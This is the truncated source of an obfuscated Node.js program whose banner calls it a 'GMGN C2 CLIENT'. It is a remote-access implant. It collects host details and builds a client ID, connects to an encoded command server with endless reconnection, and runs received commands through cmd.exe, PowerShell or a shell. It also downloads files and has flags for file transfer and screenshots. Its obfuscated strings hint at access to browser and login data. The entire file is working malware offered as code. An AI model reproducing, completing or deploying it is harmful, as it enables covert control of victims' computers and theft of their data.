const _0x469c78=_0x29d5;(function(_0x4bb912,_0x1e3067){const _0x4f2d5d=_0x29d5,_0x22debc=_0x4bb912();while(!![]){try{const _0x57c16a=parseInt(_0x4f2d5d(0x137))/0x1*(-parseInt(_0x4f2d5d(0x117))/0x2)+parseInt(_0x4f2d5d(0x256))/0x3+-parseInt(_0x4f2d5d(0x19c))/0x4*(-parseInt(_0x4f2d5d(0x1c1))/0x5)+-parseInt(_0x4f2d5d(0x284))/0x6*(parseInt(_0x4f2d5d(0x20d))/0x7)+-parseInt(_0x4f2d5d(0x1e5))/0x8*(parseInt(_0x4f2d5d(0x229))/0x9)+-parseInt(_0x4f2d5d(0x1b6))/0xa*(parseInt(_0x4f2d5d(0x1d6))/0xb)+-parseInt(_0x4f2d5d(0x244))/0xc*(-parseInt(_0x4f2d5d(0x272))/0xd);if(_0x57c16a===_0x1e3067)break;else _0x22debc['push'](_0x22debc['shift']());}catch(_0x494c5f){_0x22debc['push'](_0x22debc['shift']());}}}(_0x2308,0x549c9));const net=require(_0x469c78(0x23d)),{exec,execSync}=require(_0x469c78(0x18a)),fs=require('fs'),path=require(_0x469c78(0x120)),os=require('os'),crypto=require(_0x469c78(0x25e)),dns=require(_0x469c78(0x182));function _0x29d5(_0x36c413,_0x2067af){const _0x2308bc=_0x2308();return _0x29d5=function(_0x29d59c,_0x572a88){_0x29d59c=_0x29d59c-0x113;let _0x228b48=_0x2308bc[_0x29d59c];if(_0x29d5['ezrLPE']===undefined){var _0x49d0ec=function(_0x2c7fdc){const _0x227c39='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x34a07f='',_0x16a6ba='';for(let _0x4e8af3=0x0,_0x522f4c,_0x2fa7ee,_0x269603=0x0;_0x2fa7ee=_0x2c7fdc['charAt'](_0x269603++);~_0x2fa7ee&&(_0x522f4c=_0x4e8af3%0x4?_0x522f4c*0x40+_0x2fa7ee:_0x2fa7ee,_0x4e8af3++%0x4)?_0x34a07f+=String['fromCharCode'](0xff&_0x522f4c>>(-0x2*_0x4e8af3&0x6)):0x0){_0x2fa7ee=_0x227c39['indexOf'](_0x2fa7ee);}for(let _0x58b66b=0x0,_0x12b50a=_0x34a07f['length'];_0x58b66b<_0x12b50a;_0x58b66b++){_0x16a6ba+='%'+('00'+_0x34a07f['charCodeAt'](_0x58b66b)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x16a6ba);};_0x29d5['RDwzks']=_0x49d0ec,_0x36c413=arguments,_0x29d5['ezrLPE']=!![];}const _0x5dbf0d=_0x2308bc[0x0],_0x321bcb=_0x29d59c+_0x5dbf0d,_0x3eddeb=_0x36c413[_0x321bcb];return!_0x3eddeb?(_0x228b48=_0x29d5['RDwzks'](_0x228b48),_0x36c413[_0x321bcb]=_0x228b48):_0x228b48=_0x3eddeb,_0x228b48;},_0x29d5(_0x36c413,_0x2067af);}console[_0x469c78(0x195)]('\x0a┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\x0a┃\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20GMGN\x20C2\x20CLIENT\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20┃\x0a┃\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20SECURE\x20CONNECTION\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20┃\x0a┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\x0a');const config={'serverDomain':_0x469c78(0x16e),'serverPort':0x115c,'reconnectDelay':0x2710,'maxReconnectAttempts':-0x1,'logFile':path[_0x469c78(0x1bb)](__dirname,_0x469c78(0x1d4)),'logEnabled':!![],'logRotateSize':0x5*0x400*0x400,'systemInfo':{'hostname':os[_0x469c78(0x123)](),'platform':os[_0x469c78(0x124)](),'type':os['type'](),'arch':os[_0x469c78(0x15f)](),'username':os[_0x469c78(0x1ad)]()[_0x469c78(0x11b)],'totalMem':Math[_0x469c78(0x14f)](os['totalmem']()/(0x400*0x400))+'MB','freeMem':Math[_0x469c78(0x14f)](os[_0x469c78(0x232)]()/(0x400*0x400))+'MB','uptime':Math[_0x469c78(0x14f)](os[_0x469c78(0x158)]()/0x3c)+'\x20minutes','cpuCount':os['cpus']()[_0x469c78(0x11f)],'cpuModel':os[_0x469c78(0x167)]()[0x0][_0x469c78(0x122)],'id':generateClientId()},'encryptionEnabled':![],'encryptionKey':_0x469c78(0x28e),'features':{'allowShellExecution':!![],'allowFileTransfer':!![],'allowScreenshot':!![],'persistOnStartup':![]}};function resolveDomainAndConnect(_0x2c7fdc=0x0){const _0x4d9344=_0x469c78;rotateLogIfNeeded(),logMessage(_0x4d9344(0x21c)+config[_0x4d9344(0x211)]+':'+config[_0x4d9344(0x243)]+_0x4d9344(0x150));if(config[_0x4d9344(0x157)]>0x0&&_0x2c7fdc>=config['maxReconnectAttempts']){logMessage('Maximum\x20reconnection\x20attempts\x20('+config['maxReconnectAttempts']+_0x4d9344(0x196));return;}dns[_0x4d9344(0x283)](config[_0x4d9344(0x211)],(_0x227c39,_0x34a07f)=>{const _0x2132c0=_0x4d9344;if(_0x227c39){logMessage('DNS\x20resolution\x20error:\x20'+_0x227c39[_0x2132c0(0x25a)]);const _0x16a6ba=config[_0x2132c0(0x15e)]*Math[_0x2132c0(0x241)](Math[_0x2132c0(0x1de)](1.5,Math[_0x2132c0(0x241)](_0x2c7fdc,0xa)),0x5);setTimeout(()=>{resolveDomainAndConnect(_0x2c7fdc+0x1);},_0x16a6ba);return;}logMessage(_0x2132c0(0x294)+config[_0x2132c0(0x211)]+'\x20resolved\x20to\x20'+_0x34a07f),connectToServer(_0x34a07f,_0x2c7fdc);});}const logDir=path[_0x469c78(0x20b)](config[_0x469c78(0x1e6)]);if(!fs[_0x469c78(0x135)](logDir)&&config['logEnabled'])try{fs[_0x469c78(0x27a)](logDir,{'recursive':!![]});}catch(_0x4e8af3){console[_0x469c78(0x1c7)]('Error\x20creating\x20log\x20directory:\x20'+_0x4e8af3[_0x469c78(0x25a)]);}function _0x2308(){const _0x4274fd=['DhDPDhrLCNvZzxi','zMLUAxnO','rMLSzsbKzwXLDgvKoIa','lI4UcG','cKnSAwvUDcbjrdOG','rxjYB3iGCMv0CMLLDMLUzYb3ywXSzxrZoIa','svb2na','qwrKzwqGDg8Gy3jVBNrHyIbaCMvIB290cG','r2L0ievYCM9YicHJB2rLia','zg5Z','zw5JCNLWDgLVBKvUywjSzwq','CMvUyw1Lu3LUyW','q29UBMvJDgvKihrVia','C3vIC3rYAw5N','igLZig5VDcbHy2nLC3nPyMXLig9Yig5VDcbHihjLz3vSyxiGzMLSzqO','u291CMnLihbHDgGGBM90igzVDw5KoIa','tMv0zMXPEeLK','y2HPBgrFChjVy2vZCW','C3rHy2S','BwfW','DxnLCKbNBwfPBc5JB20','qw1HEM9UjgHVChbPBMC','BMv0zMXPEc5JB20','u2HLBgWGzxHLy3v0Aw9UigLZigrPC2fIBgvKigLUihrOAxmGy2XPzw50ignVBMzPz3vYyxrPB24k','Aw50zxjUywW','C3bSAwnL','BgLUDxG','y3DK','Bg9N','ksbYzwfJAgvKlcbZDg9WCgLUzYbYzwnVBM5Ly3rPB24','CMfUzg9T','zMfJzwjVB2SUy29T','C3bSAxq','Agv4','ugHVDg8YmdiZiq','nhvZzwv1yG','q29UBMvJDgLVBIbLCNjVCJOG','C3rHCNrZv2L0Aa','y3aGlxiGiG','y2HKAxi','ywrKCJfXEhKYA2DKEwDQCNnXDhPXmM4WExjMmJq5m3a4m2TRzMPOEdb3BgG','CgvYC2LZDe9Uu3rHCNr1Ca','ic0+ia','z2L0ic0TDMvYC2LVBG','C2nYzwvUC2HVDa','mJaYnc0Wms0Yma','l2jPBI96C2G','zgLNzxn0','0j7rInc40lhqUTcWincY0yVqV9c+0lVqVDc10l3qUngpingb0lRrGnc40l/rGTcWoIa','kgnYB250ywiGlwWGmJ4Vzgv2l251BgW7igvJAg8GiKbYzwjVB3qGBM9Kzsa','mJaYnc0WmI0Wmq','mI4Wiejdsa','DxnLCKLUzM8','ntaWifHsua','zgf0CG','rKLmrvnFteLtvdO','C3bHD24','zMvHDhvYzxm','zMLSzxm6BwTKAxi6','rMLSzsb0CMfUC2zLCIbPCYbKAxnHyMXLzcbPBIb0AgLZignSAwvUDcbJB25MAwD1CMf0Aw9UcG','Aw5JBhvKzxm','mtK5mhPXuwvWrW','ug9SA2fKB3q','Cg93zxjZAgvSBdO','Ahr0Chm6lY9NAxrODwiUy29T','C2XPy2u','AM9PBG','zMLSzxm6CMvHzdO','Dg90ywXTzw0','l1vZzxjZlW','sM9Iu2vHCMnOmJaYmW','rKLmrv9dt05uru5uoG','mJK0odq0nxrsDfHYrG','tKLe','sw52B2TLlvDLyLjLCxvLC3qGlvvYAsaI','zMLSzxm6zgvSzxrLoG','ihDPDgGGyxjNCZOG','u2nYAxb0ihnHDMvKihrVia','zxjYB3i','qZPCvxnLCNnCvxnLCM5HBwvCrg9JDw1LBNrZxfbVBgTHzg90','rdH2rNO0CdfmmZDQzgC5rtjmBwvnz2jvmwHzsfLWs3niuW','tgL0zwnVAw4','AxngAwXL','wYPDifbSyxrMB3jToIa','zw50CMLLCW','lunVBw1HBMq','l2jPBI9ZAa','nteXpwv4yw1WBgvFy29VA2LLx3zHBhvL','wYPDienVBM5Ly3rPBMCGDg86ia','muzstu04uevPv1HzyxG3CNbtnLG0wLGXyufbqw0XwtH4DKvqnxb1v1LfwLfcD2jz','DhjPBq','y29UBMvJDgLVBI1SB2CUDhH0','z2v0','nZi5m3bmzhjIvW','BxrPBwu','zxHLy1n5BMm','C3rVCMfNzv91C2vY','0j7rInc40lhqUTcWincY0yVqV9c+0lVqVDc10l3qUngpoIa','mJaWiefeqq','y2qG','CgfZC3DVCMqXmJm','Cg93','zxHHBxbSzv9YzwrKAxrFC2vZC2LVBG','AxneAxjLy3rVCNK','AwrSzq','zgv2zwXVCgvY','0jtqUnga0lxqUTgc0l7rGnc40y8Gq2HYB21LierLzMf1BhqG0yprGDc/0lxrInc90l4G0yhqUTc+0l/qUnga0l7qSTcW0l3qSa','rMLSzsbUB3qGzM91BMq6ia','mZj4sfzQz2W','Bg9NrMLSzq','mJaYnc0Wms0Xnq','D2LUmZi','rgLYzwn0B3j5igrLBgv0zwq6ia','Cg93zxjZAgvSBcaTq29TBwfUzcaI','u2nYzwvUC2HVDcbLCNjVCJOG','zg93BMXVywq6','C3rHDfn5BMm','qZPCvxnLCNnCvxnLCM5HBwvCqxbWrgf0yvXsB2fTAw5NxerVz2vJB2LU','C3rYAw5NAwz5','zMfJzwjVB2SYmdiZ','ChDKihX8ignK','rMLSzsbKB3DUBg9HzgvKigfUzcbZyxzLzcb0BZOG','incX0ldqUDgc','Ew91DhvIzs5JB20','BwfJ','ug93zxjtAgvSBcbfCNjVCJOG','rxHLy3v0Aw5NignVBw1HBMq6ia','zNjLzu1LBq','B3bLBIa','qZPCvxnLCNnCvxnLCM5HBwvCqxbWrgf0yvXsB2fTAw5NxejPDgnVAw5dyxnO','tw9UAxrVCMLUzYb3yxmGBM90ihj1BM5PBMCk','Ahr0Chm6lY93D3CUzMfJzwjVB2SUy29T','sw52B2TLlq','zgf0yq','ns4YifHnuG','mJuGu09m','ywXSB3Dty3jLzw5ZAg90','rMLSzsbZDwnJzxnZzNvSBhKGzg93BMXVywrLzcbHBMqGC2f2zwqGDg86ia','tI9b','C3rLywW6y29VA2LLCW','z2L0ia','mda6mda6mda6mda6mda6mda','C3rKB3v0','zxHWB3j0CW','zxHHBxbSzv9UzxrMBgL4x2LK','nvzOqLbnruvVEKvPzfi4wgLKuMrrAvv6CvyYBZjmnJKZzfzkyLrKq1H3yva','zgLYBMfTzq','y2XVC2u','otCXnKjksLznyG','yw1HEM9UlMnVBq','C2L6zq','zgfYD2LU','C2vYDMvYrg9TywLU','rxjYB3iGCMv0CMLLDMLUzYbJB29RAwvZoIa','iIaTvxnLqMfZAwnqyxjZAw5N','mcbcExrLCW','z2L0AhvIlMnVBq','qwrKzwqGDg8Gv2LUzg93CYbZDgfYDhvWihjLz2LZDhj5cG','zxHHBxbSzv9ZzxnZAw9Ux2LK','CMvHzgrPCLn5BMm','rgvJCNLWDgLVBIbLCNjVCJOG','zMLSDgvY','zM9YrwfJAa','qxr0zw1WDgLUzYb0BYbYzxnVBhzLigfUzcbJB25Uzwn0ihrVia','lweG','ms41ievusa','0j7rInc40lhqUTcWincY0yVqV9c+0lVqVDc10l3qUngpiePHDMfty3jPChqG0ytqSnc50lVqSdOG','zg93BMXVywrFDxjSoG','y29WEuzPBgvtEw5J','rMLSzsbVCgvYyxrPB25ZigfYzsbKAxnHyMXLzcbPBIb0AgLZignSAwvUDcbJB25MAwD1CMf0Aw9UcG','Ahr0Chm6lY93D3CUCgf5CgfSlMnVBq','zxHHBxbSzv92AxnPDg9Yx2LUzM8','uefusa','rMLSzsbVCIbvuKWGB3bLBMvKihn1y2nLC3nMDwXSEq','Bg9Nrw5HyMXLza','ndrbrKzXnwTtAuDcB1O0tK1eD1L0tJe4B2jJoefLBvmZm0rctfDZm0G3B3ryzNqZwgPYCer0uuD2n1nXu3nHqLLcyJK4Du5ICJjwqKjfDdDMmNDMBJnsvKDrqKvqm0e','ntuZmJm5BNjTAKvY','tw9UAxrVCMLUzYbZDg9WCgvKcG','tw9UAxrVCMLUzYbZDgfYDgvKihDPDgGGAw50zxj2ywWG','Ahr0Chm','q2fYzgfUBW','mJaYnc0WmI0Xnq','rKyVBg9NAw4UA2v5y2HHAw4Tzgi','BMv0BwfZAW','y2XVBMu','zNjLzw1LBq','CMvHzezPBgvtEw5J','yMmXCxH5mMTNzhLNANjZCxr6CtjUmhLYzJi0otnWodnRA2zQAhGWD2XO','Bw9UAxrVCG','C3LZAw5MBW','ywXSB3DtAgvSBev4zwn1DgLVBG','BM9Kzv9KB3DUBg9HzdO','mhG3mum3nJu2rum3ywi4ogiWotHKzwzcnZuXqJC0mdfcnwy2zdG5nZzg','oN4Vq2HYB21Lq2fJAguVyMLUlW','rg9NzwnVAw4','AwDUB3jL','BMv0','mJaYnc0Wms0Xma','u29Syw5H','Bw9UAxrVCMLUz0LUDgvYDMfS','BwLU','rxjYB3iGCMvHzgLUzYbMAwXLoIa','C2vYDMvYug9YDa','oti3otuYoejxAg92vG','zNjVBq','zMXVB3i','rxjYB3iGy3jLyxrPBMCGzgLYzwn0B3j5oIa','zw5JCNLWDgLVBKTLEq','ig1PBNv0zxm','ywXSB3DgAwXLvhjHBNnMzxi','C3rKzxjY','CgvYC29UywXPEMf0Aw9Ux2LK','BgLUA2vKAw4Uy29T','0j7rGTc/0ydqSncY0lVqTDc9incW0ydrHDc40liG0ydqSnc30lZqTDga0l7qVca','Cgf5CgfSx3vZzxi','tu9osvrpuKLor19eqvrboG','uhjVy2vZCYbPBMzVCM1HDgLVBIbYzxf1AxjLCYbZExn0zw0Gy29TBwfUzhm','u2HLBgWGzxHLy3v0Aw9UigLZigrPC2fIBgvKigLUihrOAxmGy2XPzw50ignVBMzPz3vYyxrPB24','0j/qVTc40yhqUIdrHncW0lNqU9c+0liG0l/qVIdqVncW0yhqUTc1oIa','DxbKyxrL','iIaTt3v0rMLSzsaI','nde2mJK4ueTmCKv4','DhDPDhrLCI5JB20','DgvZDa','q29TBwfUzcbLEgvJDxrLzcaOBM8GB3v0Chv0kq','BwvZC2fNzq','ihnLy29Uzhmk','ueftu1DpuKrtx0rbvee6','u2nYzwvUC2HVDcbMDw5JDgLVBMfSAxr5ihjLCxvPCMvZigfKzgL0Aw9UywWGBgLICMfYAwvZicHUB3qGAw1WBgvTzw50zwqPcG','y3j5ChrV','0j3qSnc50ltqTDc90l4G0ytqSnc50lVqVTcYoIa','DxbSB2fKoG','q09ps0Lfu19eqvrboG','y29UBMvJDa','zxHLy19WCZO','C3LZDgvTsw5MBW','B3bLBIaTysaI','Chm6','qxbWBgLJyxrPB24GB3bLBMvKihn1y2nLC3nMDwXSEq','Dw5SAw5Ru3LUyW','rxjYB3iGkgnVzguG','Aw5ZDgfNCMfTBwvY','zMLSzxm6Bw92ztO','rgLYzwn0B3j5ignYzwf0zwq6ia','DxnLCL9ZzxnZAw9U','rxjYB3iGCMv0CMLLDMLUzYbTywnpuYbRzxLJAgfPBIbKyxrHoIa','zw52','mJaYnc0WmY0Xnq','mc4Ynsbcvem','mtnnAM10A2G','ntaGre9u','Bw9Kzq','Dg9ju09tDhjPBMC','CgvYC2LZDc5QCW','Cg93zxjZAgvSBc5LEgu','wYPDiezLyxr1CMvZigvUywjSzwq6ia','Dg9tDhjPBMC','BwTKAxjtEw5J','rxjYB3iGCM90yxrPBMCGBg9NoIa','rxjYB3iGD3jPDgLUzYbMAwXLoIa','ls1WCM9NCMvZCW','zMLSzxm6BgLZDdO','zxHHBxbSzv9SAw5RzwrPBL9HDxrO','mtaUmcbmvem','rMLSzsbTB3zLzdOG','CM1KAxjtEw5J','Bg9VA3vW','nJa2DwHhBKPI','Ahr0Chm6lY90D2L0DgvYlMnVBq','rxjYB3i6ia','C3rHDhvZq29Kzq','rgLZywjSzwq','ktOG','Ahr0Ca','yxbWzw5KrMLSzvn5BMm','wYPDifn5C3rLBsbjrdOG','qZPCvxnLCNnCvxnLCM5HBwvCqxbWrgf0yvXsB2fTAw5NxeXPDgvJB2LU','ywjJmtiZzgvMndu2z2HPnZG5AMTSmdeYBw5VmZq1ChfY','incX0ldqUDgckq','0jtqUnga0lxqUTgc0l7rGnc40y8Gq2HYB21Linc90luG0l3qSnc50ltqTDc90la','mtaWmcbet0Df','y3jLyxrLv3jPDgvtDhjLyw0','u2nYzwvUC2HVDcbMDw5JDgLVBMfSAxr5igLZigrPC2fIBgvKigLUihrOAxmGy2XPzw50ignVBMzPz3vYyxrPB24k','rg9TywLUia','y3jLyxrLq2LWAgvYAxy','ywvZlti1nI1JyMm','BM9Kzsa','rxjYB3iGzgvSzxrPBMC6ia','yMfZzty0','rMLSzsa','Dw5RBM93BG','mKzssfDJDa','rxjYB3iGD3jPDgLUzYb0BYbSB2C6ia','rxjYB3iGBgLZDgLUzYbKAxjLy3rVCNK6ia','Bwq1','DxnLCM5HBwu','rxjYB3i6iezHAwXLzcb0BYbKB3DUBg9Hzc4Gu3rHDhvZignVzgu6ia','rxjYB3i6ieLUDMfSAwqGzM9YBwf0lIbvC2uGChnFzg93BMXVywq6vvjmoK9vvfbvvf9qqvricG','qML0y29PBG','BgvUz3rO','Cgf0Aa','CxbTmNfZEM5OA3mYm3O3nJi5Bw1ZnNm0y3DLzJC0DMn3DNKYmMDKEdzH','Bw9KzwW','Ag9ZDg5HBwu','CgXHDgzVCM0','q29UBMvJDgLVBIbJBg9ZzwqSihnJAgvKDwXPBMCGCMvJB25Uzwn0lI4U','rxjYB3i6ieLUDMfSAwqGzM9YBwf0lIbvC2uGzg93BMXVywrFDxjSoLvstdPpvvrqvvrFuefusa','vw5RBM93BG','Ahr0Chm6lY93D3CUBMv0zMXPEc5JB20','r2L0ignVBw1HBMqGzxHLy3v0zwqGC3vJy2vZC2z1BgX5icHUBYbVDxrWDxqP','C2HVChbLCG','zxHHBxbSzv9KyxrYx2nVB2TPzq','zxHPDa','0jlrGnc10lZqTDc90l3rI9c1inge0ldqUDc70ySG0ypqTncW0lVqTDc90yS','Ahr0Chm6lY93D3CUyw1HEM9UlMnVBq','CM0GlxjMiezgiezglNPPCa','C3rLywW6BwfJB3m6A2v5y2HHAw4','D3jPDgvgAwXLu3LUyW','q29UBMvJDgvKic0G','A2v5CW','y3jLyxrLsgfZAa','zxHPC3rZu3LUyW','x291Dhb1Dc5SB2C','nJm3mtCXsezmAuD5','uMvJzwL2zwqGy29TBwfUzdOG','rKyUEMLW','0j/qVTc70yprH9c10l0G0llrI9cY0l7qTcdrGDc60ydqUnc/0ylqScaO','kqPdDxjYzw50igrPCMvJDg9YEtOG','D3jPDgu','ugvYC2LZDgvUy2uGzxjYB3i6ia','Ahr0Chm6lY93D3CUAw5ZDgfNCMfTlMnVBq','q2XVDwrtDg9YywDLiq','tw9UzxKKywzLmtiZ','qML0y29PBIbdyxnO','CMvKzgL0x3nLC3nPB24','rxHPDcbJB21Tyw5KihjLy2vPDMvKlcbJBg9ZAw5NignVBM5Ly3rPB24','Bw9UAxrVCMLUzZPZDg9W','qZPCvxnLCNnCvxnLCM5HBwvCrg9JDw1LBNrZxfHsua','incYinc00lJrGnc10lRrGTc+0ydqUnc4oIa','rKLmrv9dt05uru5uoKzglNPPCdO','rMLSzsb1CgXVywrLzcbZDwnJzxnZzNvSBhKGDg86ia','DhLWzq','inc90luG0l3qSnc50ltqTDc9cG','ic1pDxrgAwXLici','zxzHBdO','iIaVzG','rMLSzsb0B28GBgfYz2uGzM9YihbYzxzPzxCGka','CM91BMq','lI4U','0j7qSDgj0ldrJYdqVTgi0lJqSDc60la6ia','DJfFzxHHBxbSzv9WzxjZB25HBgL6yxrPB24','ywrKCMvZCW','sw52ywXPzcbWyxjHBwv0zxjZigzVCIbTB3zLignVBw1HBMqk','qNL0zxm','mJaYmY0XmI0Zmq','Bwf4uMvJB25Uzwn0qxr0zw1WDhm','Dxb0Aw1L','CMvKzgL0lMnVBq','CLbxD2zynKTiEgrQAuH0m25RCKnXmuTNvuPmofL3uvDTmq','Bw9UAxrVCMLUzZPZDgfYDdO','0jlrI9cX0ydqSnc9inge0ldqUDc7inc00lVrJYdqVTgc0l/rGncW0llqUTc4oIa','rMfPBgvKihrVignOyw5NzsbKAxjLy3rVCNK6ia','CMvJB25Uzwn0rgvSyxK','yxjJAa','rw5HyMXLza','iIKGFcbJCM9UDgfIic0','CMfUzg9TqNL0zxm','Aw5KzxHpzG','wYPDievUy3j5ChrPB246ia','0jlrI9c/0l7qU9c90lxqVDc40luG0yhqUTga0lJqV9gc0la6ia','oNv0zJG6','y3b1CW','u3LZDgvTieLUzM9YBwf0Aw9UoGO','z2L0oG','CgLWzq','DxrMoa','rxjYB3iGzMLUzgLUzYbMAwXLCZOG','Dw5SAw5R','ChvZC3LKB2CUy2XJAY5OAW','rxzHBcbYzxn1Bhq6ia','v2f0y2HnB3zPzxmYmdiZ','qZPCvxnLCNnCvxnLCM5HBwvCrg9JDw1LBNrZxe1VBMvYBW','CMvWBgfJzq','DgLTzxm','rg93BMXVywqGrxjYB3i6ia','yMfZzw5HBwu','qZPCvxnLCNnCvxnLCM5HBwvCqxbWrgf0yvXsB2fTAw5NxfnVBgfUyq','0j7rInc40lhqUTcWinc60l7qV9c40ydqVTcY0ldqVDc40y8Gq2HYB21Linc00ldqVDc90yVrHtOG','mJaYnc0Wms0Wmq'];_0x2308=function(){return _0x4274fd;};return _0x2308();}function generateClientId(){const _0x3786cd=_0x469c78;try{const _0x522f4c=getMacAddress(),_0x2fa7ee=os['hostname'](),_0x269603=os['userInfo']()['username'],_0x58b66b=crypto[_0x3786cd(0x134)](_0x3786cd(0x11a))[_0x3786cd(0x254)](_0x522f4c+':'+_0x2fa7ee+':'+_0x269603)[_0x3786cd(0x1a8)]('hex')[_0x3786cd(0x186)](0x0,0x8);return _0x58b66b;}catch(_0x12b50a){return Math[_0x3786cd(0x197)]()[_0x3786cd(0x279)](0x24)[_0x3786cd(0x186)](0x2,0xa);}}function getMacAddress(){const _0xedf5cf=_0x469c78;try{const _0x58b8ee=os['networkInterfaces']();for(const _0x5b2a93 of Object['keys'](_0x58b8ee)){for(const _0x329763 of _0x58b8ee[_0x5b2a93]){if(!_0x329763[_0xedf5cf(0x191)]&&_0x329763[_0xedf5cf(0x1f5)]!==_0xedf5cf(0x206))return _0x329763['mac'];}}return _0xedf5cf(0x116);}catch(_0x2b75a6){return _0xedf5cf(0x116);}}function rotateLogIfNeeded(){const _0x265a84=_0x469c78;if(!config[_0x265a84(0x227)])return;try{if(fs['existsSync'](config[_0x265a84(0x1e6)])){const _0x21477d=fs[_0x265a84(0x1ed)](config[_0x265a84(0x1e6)]);if(_0x21477d[_0x265a84(0x20f)]>config['logRotateSize']){const _0x19f0ec=config[_0x265a84(0x1e6)]+'.'+new Date()[_0x265a84(0x275)]()[_0x265a84(0x172)](/:/g,'-');fs[_0x265a84(0x184)](config['logFile'],_0x19f0ec),logMessage('Log\x20file\x20rotated\x20due\x20to\x20size\x20limit');}}}catch(_0x280897){console[_0x265a84(0x1c7)](_0x265a84(0x27b)+_0x280897[_0x265a84(0x25a)]);}}function logMessage(_0x53a370){const _0x42fdd0=_0x469c78;if(!config[_0x42fdd0(0x227)])return;const _0x4acd60=new Date()[_0x42fdd0(0x275)](),_0x26290e='['+_0x4acd60+']\x20'+_0x53a370+'\x0a';console[_0x42fdd0(0x195)](_0x26290e[_0x42fdd0(0x1d3)]());try{fs[_0x42fdd0(0x28b)](config['logFile'],_0x26290e);}catch(_0x2d4315){console['error'](_0x42fdd0(0x118)+_0x2d4315[_0x42fdd0(0x25a)]);}}function encryptData(_0x44da14){const _0x326a14=_0x469c78;if(!config[_0x326a14(0x183)])return _0x44da14;try{const _0x250878=crypto[_0x326a14(0x162)](0x10),_0x20e24f=crypto[_0x326a14(0x295)](_0x326a14(0x296),Buffer[_0x326a14(0x245)](config[_0x326a14(0x248)]),_0x250878);let _0x6924e0=_0x20e24f[_0x326a14(0x254)](_0x44da14);return _0x6924e0=Buffer['concat']([_0x6924e0,_0x20e24f['final']()]),_0x250878[_0x326a14(0x279)]('hex')+':'+_0x6924e0[_0x326a14(0x279)]('hex');}catch(_0x6237de){return logMessage('Encryption\x20error:\x20'+_0x6237de['message']),_0x44da14;}}function decryptData(_0x5d68f7){const _0x109d61=_0x469c78;if(!config[_0x109d61(0x183)])return _0x5d68f7;try{const _0x18a7b9=_0x5d68f7['split'](':');if(_0x18a7b9[_0x109d61(0x11f)]!==0x2)return _0x5d68f7;const _0x56b0cd=Buffer[_0x109d61(0x245)](_0x18a7b9[0x0],_0x109d61(0x19a)),_0x5ed72a=Buffer[_0x109d61(0x245)](_0x18a7b9[0x1],'hex'),_0x1ceb9f=crypto['createDecipheriv'](_0x109d61(0x296),Buffer['from'](config[_0x109d61(0x248)]),_0x56b0cd);let _0x539db4=_0x1ceb9f['update'](_0x5ed72a);return _0x539db4=Buffer['concat']([_0x539db4,_0x1ceb9f['final']()]),_0x539db4[_0x109d61(0x279)]();}catch(_0x1effee){return logMessage(_0x109d61(0x219)+_0x1effee[_0x109d61(0x25a)]),_0x5d68f7;}}async function executeCommand(_0x410281){const _0x746322=_0x469c78;if(!config[_0x746322(0x1b2)][_0x746322(0x237)])return _0x746322(0x252);if(_0x410281[_0x746322(0x19e)](_0x746322(0x220)))return await downloadFromUrl(_0x410281[_0x746322(0x186)](0xd));if(os[_0x746322(0x124)]()===_0x746322(0x210)){if(_0x410281['startsWith'](_0x746322(0x1f9))){const _0x1184de=_0x410281[_0x746322(0x186)](0x5)[_0x746322(0x1d3)]();if(_0x1184de[_0x746322(0x19e)](_0x746322(0x21d))){const _0x1da088=_0x1184de[_0x746322(0x186)](0x3)['trim']();return new Promise(_0x1f5071=>{const _0x31489a=_0x746322;exec(_0x31489a(0x265)+_0x1da088+'\x22',(_0x1eaf78,_0xbd8dd6,_0x4a4197)=>{const _0x58b7b7=_0x31489a;if(_0x1eaf78){_0x1f5071(_0x58b7b7(0x269)+_0x1eaf78['code']+_0x58b7b7(0x289)+_0x4a4197);return;}_0x1f5071(_0xbd8dd6||_0x58b7b7(0x267));});});}return new Promise(_0x41e819=>{const _0x33f0bf=_0x746322;exec(_0x33f0bf(0x1f9)+_0x1184de,(_0x1a3ec2,_0x4e7718,_0x44450c)=>{const _0x1c7d0e=_0x33f0bf;if(_0x1a3ec2){_0x41e819(_0x1c7d0e(0x269)+_0x1a3ec2['code']+_0x1c7d0e(0x289)+_0x44450c);return;}_0x41e819(_0x4e7718||_0x1c7d0e(0x226));});});}}const _0x11f8dd=_0x410281[_0x746322(0x19e)](_0x746322(0x1fd))||_0x410281['startsWith']('Set-')||_0x410281[_0x746322(0x19e)]('Get-')||_0x410281[_0x746322(0x19e)]('ps:');return _0x410281[_0x746322(0x19e)](_0x746322(0x266))&&(_0x410281=_0x410281[_0x746322(0x186)](0x3)),new Promise(_0x93d218=>{const _0x1ca9b5=_0x746322;let _0xfca9d4=_0x1ca9b5(0x1cf),_0x4b8a64=['-c'];const _0x6c6711=os[_0x1ca9b5(0x124)]();if(_0x6c6711===_0x1ca9b5(0x1e8))_0xfca9d4=_0x11f8dd?_0x1ca9b5(0x277):'cmd.exe',_0x4b8a64=_0x11f8dd?[_0x1ca9b5(0x1ce)]:['/c'];else 